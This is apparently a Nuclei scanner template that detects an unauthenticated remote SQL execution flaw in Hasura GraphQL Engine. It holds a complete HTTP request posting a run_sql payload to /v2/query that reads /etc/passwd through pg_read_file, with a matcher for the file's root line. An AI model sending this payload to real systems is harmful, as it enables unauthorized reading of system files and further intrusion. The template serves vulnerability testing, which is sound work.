http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  raw:
  - "POST /v2/query HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n  \"type\": \"bulk\",\n  \"source\": \"default\",\n  \"args\":[\n    {\n\
    \      \"type\": \"run_sql\",\n      \"args\": {\n        \"source\":\"default\"\
    ,\n        \"sql\":\"SELECT pg_read_file('/etc/passwd',0,100000);\",\n       \
    \ \"cascade\": false,\n        \"read_only\": false\n      }\n    }\n  ]\n}\n"
id: hasura-graphql-psql-exec
info:
  author: Udyz
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: Hasura GraphQL Engine allows remote unauthenticated users to execute
    arbitrary SQL statements via the '/v2/query' endpoint (aka remote code execution).
  metadata:
    max-request: 1
  name: Hasura GraphQL Engine - Remote Code Execution
  reference:
  - https://www.exploit-db.com/exploits/49802
  severity: critical
  tags: graphql,edb,hasura,rce,vuln
